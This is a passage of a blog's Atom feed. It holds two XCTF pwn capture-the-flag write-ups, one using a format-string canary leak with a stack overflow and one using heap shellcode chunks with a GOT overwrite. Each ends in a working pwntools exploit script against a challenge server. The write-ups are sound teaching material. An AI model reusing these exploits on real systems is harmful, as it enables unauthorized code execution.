d73416506dc3b16de445f5952e5214ecaf615beb9b81de65bdef429d3bc9bef7c13266a47d2eace4f15999ad48393b06bedd992a3df79a5b01246704381043b442007a5987c50a036600da9ad1c2e6369acce55adb6a3435a55de39d24bcac32a42e06ea06c8ceab2b45979685d204145f03e6c088dd0fc358bf3b61417aa95d7b43cbf3ab491bc74813dc63f0c64398c78b5b7acdabdb5a5bf8b4fd403fc26eff44e9de2e901986c3bfb9e9cfe7352099a3b1fdc356e94320d439d14ce12b5b132190d5ad9e88be12d0433d063099b87c58cb62e48847f528543f5631169b7b54a0f313b67996df7f029a13e8247125a32c2a82b2c78854629de80c3d3d20054ee401413cc8eea65ce9e032107ae0273706567acb84433bce0c6c084979cc2cb90dd18a66be53d5f3c6e1178943947934bedda3901551547ea2758e0e47095eefd1e681a877a40f75b8ebc74b65c174932da93d4f97eb1b4a855c28dc0a8515cf53f92d07908875e634fb24881afcfb1bb0c6b27a22adec838b8d1237d93eeaf0e97cb10e16be63b342bf434eae51b515c7fdb2121b1c2b0a10fbd31ba6cb75c5bc51dcbcc1d0b1309487a9dbfafb920a2669730f484e6f55453b09b20cf9d07f71a52429c704fcf37724352098865d4b09416889bc492bfa1817b470faf39cb37ae809c96ba5577e0acc62acd09ad91589d8422ff60645e14e55227412e4ce2d4082f1ba5daad1a06c5a4e1a6c604cfa9523c252e4b15750175e78d3adbb12c2b305e4dce893961c5413ddb64b85d2fad80aa25c45a5aacb3e5d5f6b9752b2f518add44da4ffe597cc7a2dd1dabd040b55e08da1fdae4954054abd3a6dab5eb06352917dc4b8659cd2801d82577f979f71c96ffee06c1605d4387e978df5a02d780f99b84655b2c0dfb5fb908d0aefcdbb657ca5eba34b9c835bdf193afe4c8d75af34a8cf50179495d05eebcf889023c38243c612ee20fb64091052a58b6f8e3da55693a7c075396776b8733faac1600cc8628850b669fc78dd1e1414665352310b042272f8fa370bd88ecae0c9090bda32125aa333d2a26683d6f764dc1540da6e0bcbe938017119c04a9a341cba8c1122bcb2f0654ed47988d50c0730f373c398fd4ea8c5d8bcdefc44437782fa0f2125d34c3d478a9e44279889f50c7b9d6462cd6477e606ee28e7e1405395670799207fa13bad33f2f8e7ec40a809089755b7e940b900b32e19572895c54aab98061afedd153aaec4eea2182d2b873383c4ed0267f3393b405eb6449ad01dfffdc65a96c25f4497e6f7d0db63b59a8b044465a677c4606ba7e1f6dbfdb5bfcda148c032423097a4a8e8b0d27cc43368fa5e69a90a320a56b1a30234557c217d48dabc99fdaab4b371847af495ac31c6ec943477f53a70d5d03ea1be15296273fafb5f02dfacb5dd79a27</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>【XCTF-Pwn:Mary_Morto】非常简单的热身pwn（ps：我还真信了）</title>
    <link href="https://muzibing.github.io/2020/07/19/2020.07.19%EF%BC%88138%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/19/2020.07.19（138）/</id>
    <published>2020-07-18T16:00:00.000Z</published>
    <updated>2020-07-25T03:07:52.975Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-navy0x00-相关知识点font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-相关知识点font"></a> <font color="navy"><code>0x00 相关知识点</code></font></h3><blockquote><ul><li>格式化字符串的利用</li><li>金丝雀的绕过</li><li>栈的溢出</li></ul></blockquote><h3 id="font-color-navy0x01-分析题目font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-分析题目font"></a> <font color="navy"><code>0x01 分析题目</code></font></h3><blockquote><p>既然题目说是个非常简单的热身的pwn，那我就简单的<b>热一下身</b></p></blockquote><h4 id="font-color-blue1file-maryfont"><a class="markdownIt-Anchor" href="#font-color-blue1file-maryfont"></a> <font color="blue"><code>1.file mary</code></font></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># file mary</span><br><span class="line">mary: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=b7971b84c2309bdb896e6e39073303fc13668a38, stripped</span><br></pre></td></tr></table></figure><blockquote><p>该文件是一个64位的ELF可执行文件</p></blockquote><h4 id="font-color-blue2checksec-maryfont"><a class="markdownIt-Anchor" href="#font-color-blue2checksec-maryfont"></a> <font color="blue"><code>2.checksec mary</code></font></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># checksec mary</span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/2/Mary_Morton/mary&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><blockquote><p>可以看出开启了金丝雀保护和栈不可执行保护，因此我们可能需要对金丝雀进行绕过</p></blockquote><h4 id="font-color-blue3试运行程序font"><a class="markdownIt-Anchor" href="#font-color-blue3试运行程序font"></a> <font color="blue"><code>3.试运行程序</code></font></h4><p><img src="/images/138-1.png" alt></p><blockquote><p>从上图可以得知，该程序有两个选项：栈溢出和格式化字符串漏洞，那说明选项1可能有栈溢出的风险，选项2可能有格式化字符串漏洞的风险，这是我们试运行程序得到的信息，下面我就看看该程序的伪代码。</p></blockquote><h4 id="font-color-blue4获取程序的伪代码font"><a class="markdownIt-Anchor" href="#font-color-blue4获取程序的伪代码font"></a> <font color="blue"><code>4.获取程序的伪代码</code></font></h4><p><img src="/images/138-2.png" alt></p><blockquote><p>上图是程序选项为<code>1</code>时的伪代码，可以看出该模块是有栈溢出漏洞的危害</p></blockquote><p><img src="/images/138-3.png" alt></p><blockquote><p>上图是程序选项为<code>2</code>时的伪代码，可以看出该模块有格式化字符串漏洞</p></blockquote><h3 id="font-colornavy0x02-解题思路font"><a class="markdownIt-Anchor" href="#font-colornavy0x02-解题思路font"></a> <font color="navy"><code>0x02 解题思路</code></font></h3><p>      从上文对题目的分析以后，我们可以有一种利用思路是：</p><blockquote><ol><li>通过格式化字符串漏洞将Canary泄露出来</li><li>再通过选项1的栈溢出执行shellcode</li></ol></blockquote><p>      下面我们看看怎么写exp脚本：</p><h4 id="font-color-blue1泄露canaryfont"><a class="markdownIt-Anchor" href="#font-color-blue1泄露canaryfont"></a> <font color="blue"><code>1.泄露canary</code></font></h4><p>      通过上图可以看出，我们输入的<code>AAAAAAAA</code>，距离格式化字符串有6个位置，但是去掉前5个寄存器的位置，那么就是格式化字符串和<code>buf</code>的位置相邻，那么下面我们确定一下金丝雀的位置：</p><p><img src="/images/138-4.png" alt></p><blockquote><p>可以从上图看出，金丝雀的位置为<code>rbp-0x8</code>，因为<code>buf</code>的距离<code>rbp</code>的位置有<code>0x90</code>，所以我们可以得出<code>buf</code>距离 Canary有<code>0x88</code>，也就是<code>0x88/8=17</code>个地址单位，那么距离格式化字符串有<code>17（buf到canary的距离）+5（5个寄存器）+1（canary本身）=23</code>个单位，如下图所示：</p></blockquote><p><img src="/images/138-5.jpg" alt></p><blockquote><p>那么我们可以将格式化字符串设置为<code>%23$p</code>，下图是运行程序时输入的<code>%23$p</code>，输出结果为<code>0x2c3bceda73691600</code>，从后两位可得这是canary，那么我们就成功的把金丝雀泄露出来了。</p></blockquote><p><img src="/images/138-6.png" alt></p><h4 id="font-color-blue2栈溢出font"><a class="markdownIt-Anchor" href="#font-color-blue2栈溢出font"></a> <font color="blue"><code>2.栈溢出</code></font></h4><p><img src="/images/138-2.png" alt></p><blockquote><p>上图中的buf可以输入的空间大小有<code>0x100</code>，而buf到ebp的距离却只有<code>0x90</code>，所以说这里存在着栈溢出的漏洞，但是有因为有canary，所以利用方式如下图：</p></blockquote><p><img src="/images/138-7.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># ROPgadget --binary mary --string &quot;system&quot;</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x0000000000400464 : system</span><br><span class="line"></span><br><span class="line"># ROPgadget --binary mary --string &quot;flag&quot;</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x0000000000400b36 : flag</span><br></pre></td></tr></table></figure><blockquote><p>从上面的搜索结果中可以看出，该程序中里面包含“system”和“flag”的，下面我们就在IDA中搜索一下位置，看一下是否有可以直接利用的shellcode，若然还真有，如下图：</p></blockquote><p><img src="/images/138-8.png" alt></p><blockquote><p>地址为<code>0x4008DA</code>，下面我们就可以构造exp了</p></blockquote><h3 id="font-color-navy0x03-expfont"><a class="markdownIt-Anchor" href="#font-color-navy0x03-expfont"></a> <font color="navy"><code>0x03 exp</code></font></h3><p><code>选项2泄露canary，选项1进行栈溢出</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! python3</span></span><br><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#! coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"220.249.52.133"</span>,<span class="number">36580</span>)</span><br><span class="line">context(log_level=<span class="string">"debug"</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x4008DA</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">()</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"3. Exit the battle"</span>,<span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">format_string</span><span class="params">()</span>:</span></span><br><span class="line">payload1 = <span class="string">"%23$p"</span></span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">canary = int(r.recvuntil(<span class="string">"\n"</span>)[:<span class="number">16</span>],<span class="number">16</span>)</span><br><span class="line">print(<span class="string">"[*] The value of Canary is"</span>,canary)</span><br><span class="line"><span class="keyword">return</span> canary</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">overflow</span><span class="params">(canary)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"3. Exit the battle"</span>,<span class="string">"1"</span>)</span><br><span class="line">payload2 = (<span class="number">0x90</span><span class="number">-0x8</span>)*<span class="string">"a"</span> + str(p64(canary),encoding=<span class="string">"unicode_escape"</span>) + <span class="string">"a"</span>*<span class="number">8</span> + str(p64(system_addr),encoding=<span class="string">"unicode_escape"</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(payload2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">start()</span><br><span class="line">canary = format_string()</span><br><span class="line">overflow(canary)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-navy0x00-相关知识点font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x00-相关知识点font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x00
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="XCTF" scheme="https://muzibing.github.io/tags/XCTF/"/>
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
      <category term="栈相关题目" scheme="https://muzibing.github.io/tags/%E6%A0%88%E7%9B%B8%E5%85%B3%E9%A2%98%E7%9B%AE/"/>
    
  </entry>
  
  <entry>
    <title>【XCTF-Pwn:Note-service2】在堆上执行shellcode</title>
    <link href="https://muzibing.github.io/2020/07/18/2020.07.18%EF%BC%88137%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/18/2020.07.18（137）/</id>
    <published>2020-07-17T16:00:00.000Z</published>
    <updated>2020-07-19T02:55:37.613Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-navy0x00-基础知识font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-基础知识font"></a> <font color="navy"><code>0x00 基础知识</code></font></h3><h4 id="font-color-blue1什么是shellcodefont"><a class="markdownIt-Anchor" href="#font-color-blue1什么是shellcodefont"></a> <font color="blue"><code>1.什么是shellcode</code></font></h4><blockquote><p>shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 可在暂存器eip溢出后，塞入一段可让CPU执行的shellcode<strong>机器码</strong>，让电脑可以执行攻击者的任意指令。 ——维基百科</p></blockquote><h4 id="font-color-blue2shellcode的c语言形式font"><a class="markdownIt-Anchor" href="#font-color-blue2shellcode的c语言形式font"></a> <font color="blue"><code>2.shellcode的C语言形式</code></font></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *code[<span class="number">2</span>]; </span><br><span class="line">    code[<span class="number">0</span>] = <span class="string">"/bin/sh"</span>; </span><br><span class="line">    code[<span class="number">1</span>] = <span class="literal">NULL</span>; </span><br><span class="line">    execve(code[<span class="number">0</span>], code, <span class="literal">NULL</span>); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>再将上述代码进行简化：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    execve(<span class="string">"/bin/sh"</span>,<span class="number">0</span>, <span class="number">0</span>); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="font-color-blue3shellcode的汇编形式font"><a class="markdownIt-Anchor" href="#font-color-blue3shellcode的汇编形式font"></a> <font color="blue"><code>3.shellcode的汇编形式</code></font></h4><blockquote><p>将上述代码进行编译，然后在反汇编，就可以看到其汇编代码，如下：（只关注main函数的）</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0000000000001135 &lt;main&gt;:</span><br><span class="line">    1135:       55                      push   %rbp</span><br><span class="line">    1136:       48 89 e5                mov    %rsp,%rbp</span><br><span class="line">    1139:       48 83 ec 10             sub    $0x10,%rsp</span><br><span class="line">    113d:       89 7d fc                mov    %edi,-0x4(%rbp)</span><br><span class="line">    1140:       48 89 75 f0             mov    %rsi,-0x10(%rbp)</span><br><span class="line">    1144:       ba 00 00 00 00          mov    $0x0,%edx</span><br><span class="line">    1149:       be 00 00 00 00          mov    $0x0,%esi</span><br><span class="line">    114e:       48 8d 3d af 0e 00 00    lea    0xeaf(%rip),%rdi        # 2004 &lt;_IO_stdin_used+0x4&gt;</span><br><span class="line">    1155:       e8 d6 fe ff ff          callq  1030 &lt;execve@plt&gt;</span><br><span class="line">    115a:       b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">    115f:       c9                      leaveq </span><br><span class="line">    1160:       c3                      retq   </span><br><span class="line">    1161:       66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)</span><br><span class="line">    1168:       00 00 00 </span><br><span class="line">    116b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)</span><br></pre></td></tr></table></figure><blockquote><p>rax 保存系统调用号#59，这是execve的调用号<br>rdi  保存execve的第一个参数，是&quot;/bin/sh&quot;的地址<br>rsi  是指向前面用到的&quot;/bin/sh&quot;的指针开始并以空指针结尾的指针数组<br>rdx 是零，用来做execve的第三个参数<br>execve的原型是：<code>int execve(const char *filename, char *const argv[],char *const envp[]);</code></p></blockquote><p>      在很多题目中对输入的长度有限制，上述的shellcode就显得不起作用了，所以还需要精简shellcode，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov rax,0x3b</span><br><span class="line">mov rsi,0</span><br><span class="line">mov rdx,0</span><br><span class="line">mov rdi,XXX  # rdi代表的是“/bin/sh”的地址</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><blockquote><p>这是针对64位的，但是这种字节码就要比32位下的长很多，因为0x3b只需要占8个bit，所以将rax改为eax也可以，并且还减少了字节的长度，其他命令也是如此，rdi有点特殊，大家可以想一下。</p></blockquote><h4 id="font-color-blue4jmp-命令font"><a class="markdownIt-Anchor" href="#font-color-blue4jmp-命令font"></a> <font color="blue"><code>4.jmp *** 命令</code></font></h4><blockquote></blockquote><h3 id="font-color-navy0x01-解题思路font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-解题思路font"></a> <font color="navy"><code>0x01 解题思路</code></font></h3><h4 id="font-color-blue1file-pwnfont"><a class="markdownIt-Anchor" href="#font-color-blue1file-pwnfont"></a> <font color="blue"><code>1.file pwn</code></font></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># file pwn</span><br><span class="line"></span><br><span class="line">pwn: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6c3a706907441fd73514dbca2d692e7a7c9139aa, stripped</span><br></pre></td></tr></table></figure><blockquote><p>可以得到该文件是一个64位的ELF文件</p></blockquote><h4 id="font-color-blue2checksec-pwnfont"><a class="markdownIt-Anchor" href="#font-color-blue2checksec-pwnfont"></a> <font color="blue"><code>2.checksec pwn</code></font></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># checksec pwn</span><br><span class="line"></span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/2/note-service2/pwn&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><blockquote><p>可以看出NX没有开启保护，并且<code>Has RWX segments</code>说明栈和堆上的代码可执行，也就是说我们可以将我们的shellcode放入栈中，然后进行执行，除此之外开启了地址无关代码，以及金丝雀保护。下面看看伪代码：</p></blockquote><p><code>addNote函数</code></p><p><img src="/images/137-1.png" alt></p><blockquote><p>从上图中可以看出，<font color="green">程序并没有对<code>qword_2020A0[v1]</code>数组的下标进行检查，</font>从而可能导致在任意地址上进行读写操作，甚至可能改变got表中的值。从上图还可以看出，我们只能申请8字节大小的堆空间，那么我们能输入的content有多大呢？下面我们就看一下<code>sub_B69((__int64)qword_2020A0[v1], v2);</code>函数，如下图：</p></blockquote><p><img src="/images/137-2.png" alt></p><blockquote><p>从上图中可以看出，我们能往chunk中输入的字符最多有7个字节，所以说我们上文所说的shellcode就无法全部输入进去，那么我们是否可以将这些shellcode分别输入到不同的chunk，然后用jmp命令将这些shellcode连接起来呢？首先我们来确定shellcode的划分：</p><ul><li>mov eax,0x3B：5字节</li><li>mov esi,0：5字节</li><li>mov edx,0：5字节</li><li>syscall：2字节</li></ul></blockquote><p>      “/bin/sh”的值可以通过程序的输入进行输入，在这里我们用<code>atoi()函数</code>，我们看一下第一次执行<code>atoi函数</code>的汇编：</p><p><img src="/images/137-3.png" alt></p><blockquote><p>通过上图可以看出，如果输入的是&quot;/bin/sh&quot;，汇编代码会自动将其地址放入rdi中，所以无需我们自己再构造指令了。</p></blockquote><h4 id="font-color-blue3确定jmp的距离font"><a class="markdownIt-Anchor" href="#font-color-blue3确定jmp的距离font"></a> <font color="blue"><code>3.确定jmp的距离</code></font></h4><p>      上面已经得到要输入的shellcode了，但是每个chunk中的shellcode怎么连接起来呢？这就需要我们的<code>jmp short</code>指令，这是一个相对近址跳转指令，我们来看看它的原理是什么，如下图：</p><p><img src="/images/137-4.png" alt></p><blockquote><p>如上图，看地址为<code>0xE94</code>和<code>0xEA0</code>处的汇编指令，都是<code>jmp short loc_ED1</code>，那么jmp是怎么跳转到的呢？下面看上图中的右半部分，可以看出地址为<code>0xE94</code>的指令的字节为：<code>EB 3B</code>，而地址<code>0xEA0</code>的指令的字节为：<code>EB 2F</code>，它们都是跳转到地址为<code>ED1</code>处，来计算一下是怎么跳转的：</p><ul><li><code>0xE94</code>：0xe94+0x3b = 0xecf，0xecf+2 = 0xed1</li><li><code>0xEA0</code>：0xea0+0x2f = 0xecf，0xecf+2 = 0xed1</li></ul><p>也就是说要得到目标地址那么就是jmp指令距离函数loc_ED1的距离2F，那么在堆中的跳转距离是多少呢？下面画一个示意图来说明一下，如下图：</p></blockquote><p><img src="/images/137-5.png" alt></p><blockquote><p>由此看来jmp short xxx中的xxx的值是<code>该命令行结束后的地址，即图中的0x1017地址，到要执行命令的起始位置，即图中的0x1030位置</code>，所以我们可以得到jmp结束后的地址到下一个chunk用户数据处的地址的距离为：<code>1+8+8+8 = 25(0x19)</code>，为什么是这样的，可以看上图的实例。</p></blockquote><h4 id="font-color-blue4确定解题思路font"><a class="markdownIt-Anchor" href="#font-color-blue4确定解题思路font"></a> <font color="blue"><code>4.确定解题思路</code></font></h4><blockquote><p>通过上述的分析，我们确定了如下的解题思路：</p><ol><li>将我们的shellcode布置在几个不同的堆块上，如下图：</li></ol><p><img src="/images/137-6.jpg" alt></p><ol start="2"><li>根据上图是可以看到，我们可以通过数组下标溢出，将atoi的got表的值改为我们申请的第一个块的地址，但是如果一开始就修改atoi的got表，那么在后面的程序运行中会出现错误，所以我们在最后修改atoi的got表地址，而且必须放在chunk的最前面，因为这样才能形成一个完整的控制流，那么我们如何操作呢？我们可以利用uaf的技巧，这是因为该程序在释放空间时没有将指针置为NULL，当我们释放了第一个chunk，然后再申请一个相同大小的chunk，进行重复利用，从而修改atoi的got表地址；其他的chunk即按照正常的顺序申请即可，申请流程如下：</li></ol><p><img src="/images/137-7.jpg" alt></p><ol start="3"><li>从上图可以看出，我们就可以写出完整的exp</li></ol></blockquote><h3 id="font-color-navy0x02-完整expfont"><a class="markdownIt-Anchor" href="#font-color-navy0x02-完整expfont"></a> <font color="navy"><code>0x02 完整exp</code></font></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">"220.249.52.133"</span>,<span class="number">40709</span>)</span><br><span class="line">context(log_level=<span class="string">"debug"</span>)</span><br><span class="line">elf = ELF(<span class="string">"pwn"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addNote</span><span class="params">(r, index, size, content)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"your choice&gt;&gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"index:"</span>,index)</span><br><span class="line">r.sendlineafter(<span class="string">"size:"</span>,size)</span><br><span class="line">r.sendafter(<span class="string">"content"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deleteNote</span><span class="params">(r, index)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"your choice&gt;&gt; "</span>,<span class="string">"4"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"index"</span>,index)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">addNote(r,<span class="string">"0"</span>,<span class="string">"8"</span>,<span class="string">"a"</span>*<span class="number">7</span>)</span><br><span class="line">addNote(r,<span class="string">"1"</span>,<span class="string">"8"</span>,asm(<span class="string">'xor rsi,rsi'</span>,os=<span class="string">"linux"</span>,arch=<span class="string">"amd64"</span>) + <span class="string">b'\x90\x90\xeb\x19'</span>)</span><br><span class="line">addNote(r,<span class="string">"2"</span>,<span class="string">"8"</span>,asm(<span class="string">'xor rdx,rdx'</span>,os=<span class="string">"linux"</span>,arch=<span class="string">"amd64"</span>) + <span class="string">b'\x90\x90\xeb\x19'</span>)</span><br><span class="line">addNote(r,<span class="string">"3"</span>,<span class="string">"8"</span>,str(asm(<span class="string">'syscall'</span>,os=<span class="string">"linux"</span>,arch=<span class="string">"amd64"</span>),encoding=<span class="string">"unicode_escape"</span>).ljust(<span class="number">7</span>,<span class="string">'\x90'</span>))</span><br><span class="line">addNote(r,<span class="string">"4"</span>,<span class="string">"8"</span>,<span class="string">"/bin/sh"</span>)</span><br><span class="line">deleteNote(r,<span class="string">"0"</span>)</span><br><span class="line"><span class="comment">#addNote(r,str((elf.got["free"]-0x2020A0)//8),"8",asm('xor rax,rax',os="linux",arch="amd64") + b'\x90\x90\xeb\x19')</span></span><br><span class="line"><span class="comment">#addNote(r,"2","8",asm('mov eax,0x3B',os="linux",arch="amd64") + b'\xeb\x19')</span></span><br><span class="line">addNote(r,str((elf.got[<span class="string">"atoi"</span>]<span class="number">-0x2020A0</span>)//<span class="number">8</span>),<span class="string">"8"</span>,asm(<span class="string">'mov eax,0x3B'</span>,os=<span class="string">"linux"</span>,arch=<span class="string">"amd64"</span>) + <span class="string">b'\xeb\x19'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'your choice&gt;&gt;'</span>,<span class="string">'/bin/sh'</span>)  </span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-navy0x00-基础知识font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x00-基础知识font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x00 基
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="XCTF" scheme="https://muzibing.github.io/tags/XCTF/"/>
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
